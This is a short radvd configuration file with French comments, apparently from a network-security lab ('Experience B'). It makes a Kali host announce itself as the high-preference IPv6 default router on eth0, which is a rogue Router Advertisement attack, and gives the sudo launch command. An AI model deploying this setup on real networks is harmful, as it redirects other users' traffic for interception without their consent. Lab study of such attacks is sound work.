# =====================================================
# Experience B : faux routeur par defaut
# A placer sur Kali dans /tmp/ra-routeur.conf
# Lancement :
#   sudo radvd -n -C /tmp/ra-routeur.conf -p /tmp/radvd-routeur.pid
# Adapter "eth0" au nom reel de l'interface Kali.
# =====================================================
interface eth0 {
    AdvSendAdvert on;
    MinRtrAdvInterval 3;
    MaxRtrAdvInterval 10;
    AdvDefaultLifetime 60;         # Kali se propose comme routeur par defaut (60 s)
    AdvDefaultPreference high;     # preference elevee -> prioritaire
};
